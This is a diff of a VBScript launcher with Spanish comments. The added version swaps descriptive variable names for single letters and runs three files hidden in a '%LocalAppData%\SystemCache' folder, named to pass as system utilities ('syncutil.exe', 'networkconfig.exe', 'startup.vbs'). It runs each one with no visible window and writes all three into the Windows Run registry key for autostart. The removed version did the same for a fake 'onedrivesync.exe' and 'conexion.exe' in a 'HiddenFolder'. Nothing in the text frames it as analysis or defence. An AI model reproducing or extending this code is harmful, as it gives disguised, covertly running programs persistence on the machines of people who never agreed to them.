@@ -1,28 +1,35 @@
-Dim objShell, objFSO, objRegistry
-Dim downloadFolder, exePath, conexionPath, regKey, exeName, conexionName
+Dim j, k, l, m, n, o, p, q, r, s
 
-' Configuración inicial
-Set objShell = CreateObject("WScript.Shell")
-Set objFSO = CreateObject("Scripting.FileSystemObject")
+Set j = CreateObject("WScript.Shell")
+Set k = CreateObject("Scripting.FileSystemObject")
 
-downloadFolder = objShell.ExpandEnvironmentStrings("%APPDATA%\Roaming\HiddenFolder")
-exePath = downloadFolder & "\onedrivesync.exe"
-conexionPath = downloadFolder & "\conexion.exe"
+l = j.ExpandEnvironmentStrings("%LocalAppData%\SystemCache")
+m = l & "\syncutil.exe"
+n = l & "\networkconfig.exe"
+o = l & "\startup.vbs"
 
-regKey = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"
-exeName = "onedrivesync"
-conexionName = "conexion"
+p = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"
+q = "SyncUtility"
+r = "NetworkConfig"
+s = "StartupScript"
 
-' Registrar onedrivesync.exe en el inicio automático
-cmdLineEXE = Chr(34) & exePath & Chr(34)
-Set objRegistry = CreateObject("WScript.Shell")
-objRegistry.RegWrite regKey & "\" & exeName, cmdLineEXE
+' Ejecutar los archivos
+If k.FileExists(m) Then
+    j.Run Chr(34) & m & Chr(34), 0, False
+End If
 
-' Registrar conexion.exe en el inicio automático
-cmdLineCONEXION = Chr(34) & conexionPath & Chr(34)
-objRegistry.RegWrite regKey & "\" & conexionName, cmdLineCONEXION
+If k.FileExists(n) Then
+    j.Run Chr(34) & n & Chr(34), 0, False
+End If
 
-' Limpiar objetos
-Set objShell = Nothing
-Set objFSO = Nothing
-Set objRegistry = Nothing
+If k.FileExists(o) Then
+    j.Run Chr(34) & o & Chr(34), 0, False
+End If
+
+' Registrar en el inicio automático
+j.RegWrite p & "\" & q, Chr(34) & m & Chr(34), "REG_SZ"
+j.RegWrite p & "\" & r, Chr(34) & n & Chr(34), "REG_SZ"
+j.RegWrite p & "\" & s, Chr(34) & o & Chr(34), "REG_SZ"
+
+Set j = Nothing
+Set k = Nothing
